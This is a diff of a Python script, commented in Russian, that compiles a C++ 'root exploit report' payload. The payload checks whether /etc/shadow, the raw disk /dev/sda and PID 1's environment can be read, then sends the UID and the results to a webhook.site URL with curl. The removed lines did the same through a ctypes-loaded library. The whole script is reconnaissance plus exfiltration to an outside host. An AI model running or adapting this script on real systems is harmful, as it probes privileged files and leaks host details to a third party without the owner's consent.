@@ -1,39 +1,80 @@
 import subprocess
 import os
-import ctypes
 
+# Твой актуальный вебхук
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
 
-def run_payload():
-    # Шаг 1: Компиляция в Shared Library
-    # -fPIC (Position Independent Code) обязателен для библиотек
-    compile_cmd = ["g++", "-O3", "-fPIC", "-shared", "engine.cpp", "-o", "libengine.so"]
-    subprocess.run(compile_cmd, check=True)
+# C++ код, который лезет в "запретные" места системы
+cpp_source = r"""
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <dirent.h>
+
+int main() {
+    std::cout << "--- [ROOT EXPLOIT REPORT] ---\n";
     
-    # Шаг 2: Загрузка библиотеки через ctypes
-    lib_path = os.path.abspath("libengine.so")
-    lib = ctypes.CDLL(lib_path)
+    // 1. Читаем /etc/shadow (только для root)
+    std::ifstream shadow("/etc/shadow");
+    std::string line;
+    if (shadow.is_open() && std::getline(shadow, line)) {
+        std::cout << "[!] SENSITIVE: Shadow file access successful.\n";
+    }
+
+    // 2. Проверяем доступ к сырым дискам
+    std::ifstream disk("/dev/sda", std::ios::binary);
+    if (disk.is_open()) {
+        std::cout << "[!] DANGER: Raw disk access granted (can bypass filesystem).\n";
+    }
+
+    // 3. Пытаемся увидеть переменные окружения процесса PID 1 (Init/Systemd)
+    std::ifstream env("/proc/1/environ");
+    if (env.is_open()) {
+        std::cout << "[!] ESCALATION: Can read PID 1 environment (potential secrets leak).\n";
+    }
+
+    return 0;
+}
+"""
+
+def execute_demo():
+    # Сохраняем исходник
+    with open("payload.cpp", "w") as f:
+        f.write(cpp_source)
     
-    # Указываем тип возвращаемого значения (char*)
-    lib.get_system_secret.restype = ctypes.c_char_p
-    
-    # Шаг 3: Вызов C++ функции
-    secret_data = lib.get_system_secret().decode('utf-8')
-    
-    # Шаг 4: Отчет
-    report = (
-        "--- [Lumos C++ Native Inject] ---\n"
-        f"UID: {os.getuid()}\n"
-        f"Kernel Info (via C++): {secret_data}\n"
-        "Status: System access verified."
+    # Компилируем (Senior-style: -O3 для скорости и статической линковки, если нужно)
+    compile_proc = subprocess.run(
+        ["g++", "-O3", "payload.cpp", "-o", "payload_bin"], 
+        capture_output=True, text=True
     )
     
-    # Отправка
-    subprocess.run(['curl', '-s', '-X', 'POST', '--data-urlencode', f"payload={report}", WEBHOOK_URL])
-    print("[+] C++ payload executed and sent.")
+    if compile_proc.returncode != 0:
+        error_msg = f"Compilation failed: {compile_proc.stderr}"
+        subprocess.run(['curl', '-s', '-X', 'POST', '-d', error_msg, WEBHOOK_URL])
+        return
+
+    # Запускаем бинарник и ловим вывод
+    try:
+        output = subprocess.check_output(["./payload_bin"], stderr=subprocess.STDOUT).decode()
+        
+        # Финальный отчет для отправки
+        full_report = (
+            f"UID: {os.getuid()}\n"
+            f"Binary Execution Result:\n{output}"
+        )
+        
+        # Отправляем на вебхук
+        subprocess.run([
+            'curl', '-s', 
+            '-X', 'POST', 
+            '--data-urlencode', f"payload={full_report}", 
+            WEBHOOK_URL
+        ])
+        print("[+] Report sent to webhook.")
+        
+    except Exception as e:
+        subprocess.run(['curl', '-s', '-X', 'POST', '-d', f"Runtime error: {str(e)}", WEBHOOK_URL])
 
 if __name__ == "__main__":
-    # Записываем файл engine.cpp перед запуском (если его нет)
-    with open("engine.cpp", "w") as f:
-        f.write(cpp_source) # cpp_source - это код выше
-    run_payload()
+    execute_demo()
